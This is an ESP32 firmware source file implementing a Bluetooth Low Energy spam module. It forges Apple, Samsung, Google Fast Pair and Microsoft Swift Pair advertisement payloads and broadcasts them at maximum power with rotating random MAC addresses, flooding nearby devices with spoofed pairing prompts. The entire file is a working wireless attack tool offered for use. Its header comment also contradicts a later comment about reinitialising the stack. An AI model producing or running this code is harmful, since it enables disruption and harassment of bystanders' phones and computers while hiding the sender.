// Native ESP32 BLE spam — follows Marauder's executeBLESpam() pattern exactly.
// Calls NimBLEDevice::deinit() + fresh init so it doesn't conflict with ble_remote.
// On stop(), ble_remote::reinit() restores the remote-control stack.

#include "ble_spam.h"

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <esp_bt.h>
#include <esp_mac.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#include "../hal/ble_remote.h"

BleSpamModule g_bleSpam;

namespace {

static NimBLEAdvertising* s_adv = nullptr;

static const uint8_t watch_models[] = {
    0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,
    0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x70,0x71,0x72,0x73,
    0x74,0x75,0x76,0x77,0x78,0x79
};

static const uint8_t fp_debug[][3] = {
    {0x08,0x00,0x00},{0x09,0x00,0x00},{0x0A,0x00,0x00},{0x0A,0x00,0x7F},
    {0x0B,0x00,0x00},{0x0C,0x00,0x00},{0x35,0x00,0x00},{0x47,0x00,0x00},
    {0x48,0x00,0x00},{0x49,0x00,0x00},
};

static void randMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
    mac[5] |= 0xC0;
}

// Configure the already-running NimBLE stack (initialised by ble_remote) for spam.
// Never call deinit/init — that crashes the ESP32 while the stack is live.
static void bleSpamInit() {
    NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
    NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
    NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_SCAN);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    // Reuse the server/advertising object created by ble_remote.
    NimBLEServer* pServer = NimBLEDevice::getServer();
    if (!pServer) pServer = NimBLEDevice::createServer();
    s_adv = pServer->getAdvertising();
    s_adv->stop();
    s_adv->setMinInterval(0x20);
    s_adv->setMaxInterval(0x20);
    s_adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    s_adv->enableScanResponse(false);

    Serial.println("[ble_spam] BLE configured for spam");
}

// Send buf as raw advertisement, burst 6 times with rotating MAC (Marauder parity).
static void sendBurst(const uint8_t* buf, size_t len) {
    for (uint8_t n = 0; n < 6; n++) {
        uint8_t rmac[6];
        randMac(rmac);
        NimBLEDevice::setOwnAddr(rmac);

        NimBLEAdvertisementData ad;
        ad.addData(buf, len);
        s_adv->setAdvertisementData(ad);
        s_adv->start();
        delay(40);
        s_adv->stop();
    }
}

// ---- Payload builders --------------------------------------------------------

static void spamApple() {
    const uint8_t acts[] = {
        0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B,0x05,0x24,0x2F,0x21
    };
    uint8_t act  = acts[esp_random() % sizeof(acts)];
    uint8_t flag = (act == 0x21) ? 0x40 : 0xC0;
    uint8_t buf[] = {
        0x0A, 0xFF, 0x4C, 0x00,
        0x0F, 0x05, flag, act,
        (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF)
    };
    sendBurst(buf, sizeof(buf));
}

static void spamAppleNearby() {
    const uint8_t acts[] = {0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B};
    uint8_t act  = acts[esp_random() % sizeof(acts)];
    uint8_t flag = (act == 0x20) ? 0xBF : 0xC0;
    uint8_t buf[] = {
        0x10, 0xFF, 0x4C, 0x00,
        0x0F, 0x05, flag, act,
        (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),
        0x00, 0x00, 0x10,
        (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF)
    };
    sendBurst(buf, sizeof(buf));
}

static void spamAppleNotYours() {
    const uint16_t types[] = {
        0x0E20,0x0A20,0x0220,0x0F20,0x1320,0x1420,0x1020,0x0620,
        0x0320,0x0B20,0x0C20,0x1120,0x0520,0x0920,0x1720,0x1220,0x1620
    };
    uint16_t t = types[esp_random() % 17];
    uint8_t buf[31];
    uint8_t i = 0;
    buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x07; buf[i++]=0x19; buf[i++]=0x01;
    buf[i++]=(t>>8)&0xFF; buf[i++]=t&0xFF;
    buf[i++]=0x55;
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=0x00; buf[i++]=0x00;
    for (int k=0; k<16; k++) buf[i++]=(uint8_t)(esp_random()&0xFF);
    sendBurst(buf, 31);
}

static void spamSamsung() {
    uint8_t model = watch_models[esp_random() % sizeof(watch_models)];
    uint8_t buf[] = {
        14, 0xFF, 0x75, 0x00,
        0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00,
        0x00, 0x43, model
    };
    sendBurst(buf, sizeof(buf));
}

static void spamMicrosoft() {
    uint8_t nlen = 4 + (esp_random() % 7);
    if (nlen > 7) nlen = 7;
    uint8_t buf[14];
    uint8_t i = 0;
    buf[i++] = 6 + nlen; buf[i++] = 0xFF;
    buf[i++] = 0x06; buf[i++] = 0x00;
    buf[i++] = 0x03; buf[i++] = 0x00; buf[i++] = 0x80;
    for (uint8_t k = 0; k < nlen; k++) buf[i++] = 'A' + (esp_random() % 26);
    sendBurst(buf, i);
}

static void spamGoogle() {
    static const uint8_t kFpModels[][3] = {
        {0x00,0x00,0x08},{0x00,0x01,0x1A},{0x00,0x00,0x35},{0xC2,0x66,0x00},
        {0x71,0x8B,0x0F},{0x22,0x35,0x00},{0x1E,0x8E,0x0F},{0x72,0xEF,0x8F},
        {0x04,0x00,0x00},{0x2E,0x01,0x00},{0x01,0x00,0x00},{0x96,0x40,0x0F},
    };
    const uint8_t (*tbl)[3];
    uint8_t count;
    if (esp_random() % 2 == 0) {
        tbl   = fp_debug;
        count = sizeof(fp_debug) / sizeof(fp_debug[0]);
    } else {
        tbl   = kFpModels;
        count = sizeof(kFpModels) / sizeof(kFpModels[0]);
    }
    uint8_t di = esp_random() % count;
    uint8_t m0 = tbl[di][0], m1 = tbl[di][1], m2 = tbl[di][2];
    uint8_t buf[] = {
        0x02, 0x01, 0x06,
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE, m0, m1, m2,
    };
    sendBurst(buf, sizeof(buf));
}

// ---- Task --------------------------------------------------------------------

void bleNativeTask(void* arg) {
    BleSpamModule* self = reinterpret_cast<BleSpamModule*>(arg);
    Serial.println("[ble_spam] task started");

    uint8_t  cursor = 0;
    uint32_t count  = 0;
    uint32_t lastReport = millis();

    while (self->isRunning()) {
        switch (self->getType()) {
            case BleSpamType::APPLE:
                switch (cursor % 3) {
                    case 0: spamApple();        break;
                    case 1: spamAppleNearby();  break;
                    case 2: spamAppleNotYours(); break;
                }
                break;
            case BleSpamType::GOOGLE:    spamGoogle();    break;
            case BleSpamType::SAMSUNG:   spamSamsung();   break;
            case BleSpamType::MICROSOFT: spamMicrosoft(); break;
            default:
                switch (cursor % 8) {
                    case 0: case 4: spamApple();         break;
                    case 1: case 5: spamAppleNotYours(); break;
                    case 2:         spamAppleNearby();   break;
                    case 3:         spamGoogle();        break;
                    case 6:         spamSamsung();       break;
                    case 7:         spamMicrosoft();     break;
                }
                break;
        }
        cursor++;
        count++;

        if (millis() - lastReport >= 1000) {
            self->updateAdvsPerSec(count);
            Serial.printf("[ble_spam] adv/sec=%lu\n", (unsigned long)count);
            count = 0;
            lastReport = millis();
        }
        vTaskDelay(1);
    }

    if (s_adv) s_adv->stop();
    Serial.println("[ble_spam] task exiting");
    self->clearTask();
    vTaskDelete(nullptr);
}

}  // namespace

// ---- IModule -----------------------------------------------------------------

bool BleSpamModule::init()        { return true; }
bool BleSpamModule::isAvailable() { return true; }

void BleSpamModule::start() {
    if (running_.exchange(true)) return;
    if (task_ != nullptr) { running_ = false; return; }

    ble_remote::stop();
    bleSpamInit();

    xTaskCreatePinnedToCore(bleNativeTask, "ble_spam", 8192, this, 1, &task_, 0);
}

void BleSpamModule::stop() {
    if (!running_) return;
    running_ = false;
    for (int i = 0; i < 100 && task_; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    task_  = nullptr;
    s_adv  = nullptr;

    s_adv = nullptr;
    ble_remote::reinit();
}

void BleSpamModule::fillStats(char* buf, size_t len) {
    snprintf(buf, len, "%lu/s", (unsigned long)adv_per_sec_.load());
}
